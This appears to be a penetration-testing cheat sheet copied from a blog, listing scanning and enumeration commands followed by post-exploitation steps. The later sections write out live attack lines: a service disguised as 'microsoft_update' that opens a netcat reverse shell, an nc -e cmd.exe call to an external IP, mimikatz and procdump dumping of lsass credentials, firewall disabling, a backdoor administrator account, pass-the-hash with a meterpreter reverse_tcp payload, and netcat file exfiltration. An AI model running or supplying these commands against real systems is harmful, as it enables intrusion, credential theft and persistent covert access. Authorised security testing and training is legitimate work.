# Nmap Full Web Vulnerable Scan

cd /usr/share/nmap/scripts/
wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
nmap -sS -sV --script=vulscan/vulscan.nse target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
nmap -sV --script=vuln target
nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target

# Dirb Dir Bruteforce:

dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt

# Nikto web server scanner

nikto -C all -h http://IP

# WordPress Scanner

git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
./wpscan –url http://IP/ –enumerate p

# HTTP Fingerprinting

wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
cd httprint_301/linux/
./httprint -h http://IP -s signatures.txt

# SKIP Fish Scanner

skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP

# Nmap Ports Scan

1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)
1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)
2)fargement
3)data packed – like orginal one not scan packet
4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target
5)nmap –source-port 53 target
nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)
nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)
nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)
nmap -sA -PN -sN target
nmap -sS -sV -T5 -F -A -O target (version detection)
nmap -sU -v target (Udp)
nmap -sU -P0 (Udp)
nmap -sC 192.168.31.10-12 (all scan default)

# NC Scanning

nc -v -w 1 target -z 1-1000
for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done

# Unicornscan

us -H -msf -Iv 192.168.56.101 -p 1-65535
us -H -mU -Iv 192.168.56.101 -p 1-65535

-H resolve hostnames during the reporting phase
-m scan mode (sf - tcp, U - udp)
-Iv - verbose

# Xprobe2 OS fingerprinting

xprobe2 -v -p tcp:80:open IP

# Samba Enumeration

nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target

# SNMP Enumeration

snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP

# Windows Useful cmds

net localgroup Users
net localgroup Administrators
search dir/s *.doc
system("start cmd.exe /k $cmd")
sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits

# PuTTY Link tunnel

Forward remote port to local address
plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP

# Meterpreter portfwd

#https://www.offensive-security.com/metasploit-unleashed/portfwd/
#forward remote port to local address
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali > rdesktop 127.0.0.1:3389

# Enable RDP Access

reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable

# Turn Off Windows Firewall

netsh firewall set opmode disable

# Meterpreter VNC\RDP

a
#https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
run getgui -u admin -p 1234
run vnc -p 5043

# Add New user in Windows

net user test 1234 /add
net localgroup administrators test /add

# Mimikatz use

git clone https://github.com/gentilkiwi/mimikatz.git
privilege::debug
sekurlsa::logonPasswords full

# Passing the Hash

git clone https://github.com/byt3bl33d3r/pth-toolkit
pth-winexe -U hash //IP cmd

or

apt-get install freerdp-x11
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

or

meterpreter > run post/windows/gather/hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
meterpreter > shell

# Hashcat password cracking

hashcat -m 400 -a 0 hash /root/rockyou.txt

# Netcat examples

c:> nc -l -p 31337
#nc 192.168.0.10 31337
c:> nc -v -w 30 -p 31337 -l < secret.txt
#nc -v -w 2 192.168.0.10 31337 > secret.txt

Continue.... 

Source: https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/
